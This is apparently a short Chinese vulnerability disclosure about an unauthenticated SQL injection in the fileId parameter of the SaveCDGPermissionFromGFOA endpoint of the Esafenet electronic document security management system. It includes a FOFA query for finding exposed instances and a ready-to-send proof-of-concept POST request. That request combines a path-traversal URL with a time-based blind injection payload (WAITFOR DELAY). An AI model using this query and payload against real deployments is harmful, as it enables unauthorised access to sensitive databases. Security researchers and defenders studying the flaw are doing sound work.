## 亿赛通-电子文档安全管理系统SaveCDGPermissionFromGFOA接口存在sql注入漏洞

由于亿赛通电子文档安全管理系统SaveCDGPermissionFromGFOA处fileID对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，未授权的攻击者可获取数据库敏感信息。

## fofa

```
app="亿赛通-电子文档安全管理系统"
```

## poc

```
POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 39
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
 
fileId=1';WAITFOR DELAY '0:0:2'--&pis=1
```

